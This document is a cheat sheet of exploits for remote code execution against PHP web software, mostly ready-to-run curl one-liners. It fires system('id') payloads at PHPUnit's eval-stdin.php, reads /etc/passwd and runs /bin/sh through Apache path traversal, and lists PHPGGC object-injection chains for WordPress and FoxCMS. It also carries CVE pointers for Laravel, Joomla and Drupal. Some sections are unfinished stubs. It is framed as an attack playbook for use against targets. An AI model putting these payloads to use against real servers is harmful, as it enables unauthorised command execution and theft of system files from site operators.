# PHP RCE — Comprehensive Exploit Guide
## Last Updated: Mon Jul 06 2026

## 1. PHPUnit eval-stdin (CVE-2017-9841)
curl -sk -X POST "<target>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" -d '<?php system("id");?>'
curl -sk -X POST "<target>/phpunit/src/Util/PHP/eval-stdin.php" -d '<?php system("id");?>'
curl -sk -X POST "<target>/src/Util/PHP/eval-stdin.php" -d '<?php system("id");?>'
curl -sk -X POST "<target>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" -d '<?php echo shell_exec("id 2>&1");?>'

## 2. CVE-2025-29306 — FoxCMS Unserialize RCE
## Vuln: index.html component unserialize() on attacker input
## Payload: PHPGGC chain or manual PHP serialized object
python3 -c '
import requests
url = "http://target/index.html"
# PHP serialized payload with command
payload = 'O:...'  # PHPGGC generated
requests.post(url, data={"data": payload})
'

## 3. CVE-2025-7384 — WordPress DB Plugin PHP Object Injection
## Plugin: Database for Contact Form 7, WPforms, Elementor forms <= 1.4.3
## Function: get_lead_detail() deserializes untrusted input
## Chain with Contact Form 7 POP chain for RCE
## Detection:
curl -sk "<target>/wp-content/plugins/database-for-contact-form-7/" | head -5
## Exploit: PHPGGC + WordPress chain
phpggc WordPress/RCE system id

## 4. CVE-2025-32432 — Craft CMS RCE
## Research pending — check latest

## 5. CVE-2025-2035 — Ecommerce-Website-using-PHP RCE
## Research pending — check latest

## 6. Apache CVE-2021-41773/42013
curl -sk "<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
curl -sk "<target>/cgi-bin/.%%32%65/.%%32%65/etc/passwd"
curl -sk "<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh" -d "echo;id"

## 7. WordPress RCE via Theme Editor (authenticated)
## Requires admin creds
## POST to /wp-admin/theme-editor.php with file contents

## 8. Laravel RCE vectors
## CVE-2021-3129 (Ignition): POST /_ignition/execute-solution
## CVE-2018-15133 (unserialize via APP_KEY)
## Debug mode RCE: /_debugbar/open
## .env debug=true + X-Igonore-User header

## 9. Joomla! RCE
## CVE-2023-23752 (unauthorized API access)
## /index.php?option=com_fields&view=fields&layout=edit (PHP Object Inj)

## 10. Drupal RCE
## CVE-2018-7600 (Drupalgeddon2)
## CVE-2018-7602
## CVE-2019-6339
